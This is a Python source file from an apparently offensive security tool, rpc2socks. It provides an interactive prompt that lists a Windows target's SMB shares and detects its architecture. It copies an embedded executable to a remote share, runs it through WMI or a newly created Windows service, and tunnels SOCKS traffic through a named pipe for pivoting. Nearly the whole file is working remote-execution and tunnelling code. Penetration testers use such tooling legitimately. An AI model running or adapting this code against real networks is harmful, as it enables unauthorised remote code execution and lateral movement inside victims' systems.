# Copyright (c) Lexfo
# SPDX-License-Identifier: BSD-3-Clause

import cmd
import contextlib
import sys
import time

from . import bridge as mod_bridge
from . import constants
from . import embexe
from . import namedpipeclient
from . import proto
from . import smb
from . import svcmgr as mod_svcmgr
from . import wmi
from .utils import cmdkeyint
from .utils import dispatcher
from .utils import logging
from .utils import tcpserver

__all__ = ("BridgeCli", )

logger = logging.get_internal_logger(__name__)

_USAGE = """
standalone commands:

  help, h, ?
    print this text

  shares
    * fetch the list of host's shares
    * connect through SMB and query shares list
    * synchronous command

  arch [host]
    * query host's architecture (via DCERPC; TCP 135)
    * [host] defaults to the one specified from the command line
    * [host] can be host's name or IP address
    * synchronous command

  quit, q
    * disconnect and leave this prompt
    * does NOT uninstall dropped exe from target if any
    * synchronous command

rpc2socks related:

  inst [con|svc] [auto|32|64]
    * default: "inst con auto"
    * remote copy and execute rpc2socks to target
    * "auto" implies a call to "arch" command first to select which embedded exe
      to drop; defaults to 32-bit if "auto" fails
    * "con": drop exe via SMB and execute it via WMI as a win32 console app
    * "svc": drop exe via SMB, create a Windows Service via DCERPC and start it
    * synchronous command

  uninst [con|svc]
    * uninstall from target
    * this sends an app-layer STOP request through named pipe (automatically
      connects if needed)
    * then delete the service entry from the Service Manager (if "svc" is
      specified, or if it was specified when calling "inst")
    * then delete file by sending an SMB request
    * synchronous command

  co
    * connect to named pipe (only if disconnected; no-op otherwise)
    * implies server-side to be installed and running
    * synchronous command

  reco
    * forcefully reconnect to named pipe and re-launch local SOCKS relay
    * synchronous command

  ping
    send an application-layer PING request to named pipe's server-side

  st
    print connectivity status

"""


class BridgeCli(cmdkeyint.Cmd,
                namedpipeclient.ProtoClientObserver,
                tcpserver.TcpServerObserver):
    def __init__(self, *,
                 smb_config, pipe_name, rshare_name, rexe_name,
                 proto_keep_alive=None, socks_bind_addrs, start_cmds=()):
        tcpserver.TcpServerObserver.__init__(self)
        namedpipeclient.ProtoClientObserver.__init__(self)

        # cmd.Cmd init
        cmdkeyint.Cmd.__init__(self)
        self.intro = '\n  This is rpc2socks prompt. "?" for help.\n'
        self.prompt = "rpc2socks>>> "

        # config
        self._smbconfig = smb_config
        self._pipe_name = pipe_name
        self._rshare_name = rshare_name
        self._rexe_name = rexe_name
        self._proto_keep_alive = proto_keep_alive
        self._socks_bind_addrs = socks_bind_addrs

        # state
        self._quit = False
        self._is_uninstalling = False
        self._bridge = None
        self._service_installed = None

        # for cmd in start_cmds:
        #     self.cmdqueue.append(cmd)

    #
    # cmd.Cmd overrides below
    #

    def emptyline(self):
        # just print an empty line, or leave prompt
        return self._quit

    def precmd(self, line):
        # so to ignore "# comment"
        if line.lstrip().startswith("#"):
            return ""
        else:
            return line

    def do_EOF(self, argsline):
        res = cmdkeyint.Cmd.do_EOF(self, argsline)
        return True if res is None else res

    def do_KeyboardInterrupt(self, argsline):
        logger.warning("caught SIGINT")
        return self.onecmd("quit")

    #
    # own commands below
    #

    def do_help(self, argsline):
        print(_USAGE, end="", flush=True)

    do_h = do_help

    def do_arch(self, argsline):
        if self._quit:
            return True

        host = argsline.strip()
        if not host:
            host = self._smbconfig.rhost_str

        logger.info(f"querying architecture of {host} via DCERPC (TCP 135)...")
        is64bit = smb.query_host_arch(host)

        if is64bit is True:
            print(f"{host} is 64-bit")
        elif is64bit is False:
            print(f"{host} is 32-bit")
        else:
            print(f"ERROR: failed to get {host}'s architecture")

    def do_co(self, argsline):
        if self._quit:
            return True

        if self._bridge is not None and self._bridge.all_connected:
            print("bridge already connected")
        else:
            self._reconnect_bridge()

    def do_inst(self, argsline):
        if self._quit:
            return True

        winservice = False
        use64bit = None  # auto

        # arg [auto|32|64|con|svc]...
        args = argsline.lower().split()
        for arg in args:
            if arg == "auto":
                use64bit = None
            elif arg == "64":
                use64bit = True
            elif arg == "32":
                use64bit = False
            elif arg == "con":
                winservice = False
            elif arg == "svc":
                winservice = True
            else:
                print(f'ERROR: unknown arg "{argsline}"')
                return

        self._install(winservice, use64bit)

    def do_ping(self, argsline):
        if self._quit:
            return True

        if self._bridge is None:
            print("bridge not connected")
        else:
            packet = proto.PingPacket()
            packet = packet.serialize()
            if not self._bridge.protoclient_send(packet):
                print("ERROR: failed to send PING request")

    def do_quit(self, argsline):
        self._quit = True
        self._disconnect_bridge()
        return True

    do_q = do_quit

    def do_reco(self, argsline):
        if self._quit:
            return True

        self._reconnect_bridge()

    def do_shares(self, argsline):
        if self._quit:
            return True

        smbconn = None
        shares = None

        try:
            smbconn = self._smbconfig.spawn_smb_connection()
            shares = smbconn.list_shares()
        except Exception as exc:
            logger.error("failed to fetch shares:", str(exc))
        finally:
            if smbconn is not None:
                with contextlib.suppress(Exception):
                    smbconn.close()
                smbconn = None

        if not shares:
            print("list of shares empty")
        else:
            print(f"received a list of {len(shares)} shares:")
            for share in shares:
                with contextlib.suppress(KeyError):
                    share = str(share["shi1_netname"][:-1])
                    print(f'  "{share}"')

    def do_st(self, argsline):
        if self._quit:
            return True

        pipe_status = (
            self._bridge is not None and
            self._bridge.protoclient_connected)
        pipe_status = "connected to " if pipe_status else "DISCONNECTED from "
        pipe_status += f"\\\\{self._smbconfig.addr_str}\\pipe\\{self._pipe_name}"

        if self._bridge is None or not self._bridge.socksrelay_running:
            socksrelay_status = "STOPPED"
        else:
            addr = ", ".join([
                str(a) for a in self._bridge.socksrelay_bind_addresses])
            socksrelay_status = "listening on " + addr

        print("PROTO:", pipe_status)
        print("SOCKS:", socksrelay_status)

    def do_uninst(self, argsline):
        if self._quit:
            return True

        uninst_service = None  # auto, i.e. depends on self._service_installed

        # arg [con|svc]
        args = argsline.lower().split()
        for arg in args:
            if arg == "con":
                uninst_service = False
            elif arg == "svc":
                uninst_service = True
            else:
                print(f'ERROR: unknown arg "{argsline}"')
                return

        self._uninstall(uninst_service)

    #
    # callback methods below
    #

    def _on_tcp_stopped(self, tcp_server, exception):
        if self._quit:
            logger.info("local SOCKS relay stopped")
        else:
            logger.warning(
                "local SOCKS relay stopped; type \"quit\" and restart")

            self._quit = True

            if self._bridge is not None:
                self._bridge.request_termination()

    def _on_proto_connected(self, np_client):
        logger.info(f"connected to {np_client.addr_str}")

    def _on_proto_disconnected(self, np_client):
        msg = f"disconnected from {np_client.addr_str}"

        if self._quit or self._is_uninstalling:
            logger.info(msg)
        else:
            logger.warning(msg)

            time.sleep(0.5)
            if not np_client.reconnect():
                time.sleep(0.5)
                np_client.reconnect()

    def _on_proto_recv_PING(self, np_client, packet):
        logger.info(
            f"replied to a PING request from named pipe {np_client.addr_str}")

    #
    # private methods below
    #

    def _disconnect_bridge(self, *, log=True):
        if self._bridge is not None:
            if log:
                logger.hinfo("waiting for bridge to close")

            self._bridge.unregister_observer(self)
            self._bridge.request_termination()
            self._bridge.join()
            self._bridge = None

            if log:
                logger.hinfo("bridge closed")

    def _reconnect_bridge(self):
        # this is a blind full reset
        if self._bridge is not None:
            self._disconnect_bridge()

        if self._quit:
            return False

        logger.hinfo("creating bridge")
        self._bridge = mod_bridge.BridgeThread(
            smb_config=self._smbconfig,
            pipe_name=self._pipe_name,
            proto_keep_alive=self._proto_keep_alive,
            socks_bind_addrs=self._socks_bind_addrs,
            observers=(self, ))

        # waiting for bridge to be ready
        if not self._bridge.all_connected:
            logger.info(
                f"waiting for connection to "
                f"{self._bridge.protoclient_addr_str}")

            socksrelay_running = None
            start_time = time.monotonic()

            while True:
                if self._quit:
                    return False

                if not socksrelay_running:
                    socksrelay_running = self._bridge.socksrelay_running

                if socksrelay_running and self._bridge.protoclient_connected:
                    break

                elapsed = time.monotonic() - start_time
                if elapsed >= 5.0:
                    logger.error(
                        f"failed to connect to "
                        f"{self._bridge.protoclient_addr_str} or to launch "
                        f"SOCKS relay")
                    self._disconnect_bridge(log=False)
                    return False

        logger.hinfo("bridge connected")

        return True

    def _install(self, winservice, use64bit):
        assert use64bit is None or use64bit is False or use64bit is True

        # check if bridge is not already connected,
        # or remote exe already running
        if self._bridge is not None and self._bridge.protoclient_connected:
                print("bridge already installed and connected")
                return True
        else:
            logger.hinfo(
                "checking first if remote exe is not already installed and "
                "running")

            self._disconnect_bridge(log=False)
            self._reconnect_bridge()

            if self._bridge is not None and self._bridge.protoclient_connected:
                print("bridge installed and connected")
                return True
            else:
                logger.hinfo("remote exe does not seem to be running")
                self._disconnect_bridge(log=False)

        RPATH_FMT = r"\\{host}\{share}\{exename}"
        RSHARE = self._rshare_name
        REXENAME = self._rexe_name

        # query host arch if needed
        if use64bit is None:
            logger.hinfo("querying host's arch")
            use64bit = smb.query_host_arch(self._smbconfig.rhost_str)

            if use64bit is not False and use64bit is not True:
                logger.warning(
                    "failed to query host's architecture; defaulting to 32-bit")
                use64bit = False

        exe_display_name = "64-bit" if use64bit else "32-bit"
        exe_display_name += " service" if winservice else " console"

        # extract embedded exe and get a file object
        logger.hinfo(f"extracting embedded {exe_display_name} exe")
        embedded_file = embexe.stream_embedded_svc_exe(
            sixty_four=use64bit, winservice=winservice)

        # remote copy embedded exe
        logger.info(
            f"dropping {exe_display_name} exe to " +
            RPATH_FMT.format(
                host=self._smbconfig.addr_str, share=RSHARE, exename=REXENAME))
        try:
            res = smb.put_file(
                fileish=embedded_file, smbconfig=self._smbconfig,
                share=RSHARE, destname=REXENAME)
            if not res:
                return False
        except Exception:
            logger.exception("failed to remote copy exe file")
            return False
        finally:
            # free resources
            embedded_file.close()
            del embedded_file

        # remote exec dropped file
        if winservice:
            if not self._install__rexec_winservice(RSHARE, REXENAME):
                return False
            self._service_installed = True
        else:
            if not self._install__rexec_wmi(RSHARE, REXENAME):
                return False

        logger.hinfo("remote execution successful")

        # give server-side some time to warm up
        time.sleep(2.5)

        logger.hinfo("trying to connect")
        return self._reconnect_bridge()

    def _install__rexec_wmi(self, rshare, rexename):
        RCMDLINE = f"cmd.exe /C \\\\localhost\\{rshare}\\{rexename}"
        RWORKDIR = f"\\\\localhost\\{rshare}"

        res = wmi.wmi_rexec(
            self._smbconfig,
            cmdline=RCMDLINE,
            workdir=RWORKDIR,
            wait=False, wait_poll_delay=2.0)
        if not res:
            logger.error("failed to remote execute")
            logger.error(f"command line was: {RCMDLINE}")
            logger.error(f"remote workdir was: {RWORKDIR}")
            return False

        return True

    def _install__rexec_winservice(self, rshare, rexename):
        SVCNAME = constants.DEFAULT_SERVICE_NAME
        SVCDISPNAME = constants.DEFAULT_SERVICE_DISPLAY_NAME
        RPATH = f"\\\\localhost\\{rshare}\\{rexename}"

        logger.hinfo(
            f'installing and starting service as "{SVCNAME}" '
            f'(displayed as "{SVCDISPNAME}")')

        svcmgr = None

        try:
            svcmgr = mod_svcmgr.ServiceManager(smbconfig=self._smbconfig)
            svcmgr.open()
            svcmgr.create_service(SVCNAME, SVCDISPNAME, RPATH, start=True)
            return True
        except Exception as exc:
            logger.exception(f"failed to install or start remote service ")
            return False
        finally:
            if svcmgr is not None:
                with contextlib.suppress(Exception):
                    svcmgr.close()
                del svcmgr

    def _uninstall(self, uninst_service):
        self._is_uninstalling = True
        try:
            return self._uninstall_impl(uninst_service)
        finally:
            self._is_uninstalling = False

    def _uninstall_impl(self, uninst_service):
        # bridge must be connected so that we can send the UNINSTALL packet
        if self._bridge is None or not self._bridge.protoclient_connected:
            self._disconnect_bridge(log=False)
            self._reconnect_bridge()

        # send UNINSTALL command
        if self._bridge is None or not self._bridge.protoclient_connected:
            logger.warning(
                f"failed to connect to \\\\{self._smbconfig.rhost_str}\\pipe"
                f"\\{self._pipe_name}")
        else:
            logger.info("sending UNINSTALL command")

            packet = proto.UninstallSelfPacket()
            packet = packet.serialize()

            if not self._bridge.protoclient_send(packet):
                logger.error(
                    "failed to send UNINSTALL command to server-side; "
                    "ignoring error and proceeding")
            else:
                # give remote exe some time to receive and process UNINSTALL
                time.sleep(2.0)

        self._disconnect_bridge()

        # give remote exe extra time to terminate
        time.sleep(2.5)

        # if exe was installed as a service, delete it from the manager
        if self._service_installed or uninst_service:
            SVCNAME = constants.DEFAULT_SERVICE_NAME
            svcmgr = None

            try:
                svcmgr = mod_svcmgr.ServiceManager(smbconfig=self._smbconfig)
                svcmgr.open()
                svcmgr.delete_service(SVCNAME)
            except Exception as exc:
                logger.error(
                    f'failed to delete remote service "{SVCNAME}": {exc}')
            finally:
                if svcmgr is not None:
                    with contextlib.suppress(Exception):
                        svcmgr.close()
                    del svcmgr

                self._service_installed = False

        # delete remote exe
        logger.hinfo("deleting remote exe")
        return smb.delete_file(
            smbconfig=self._smbconfig, share=self._rshare_name,
            destname=self._rexe_name)
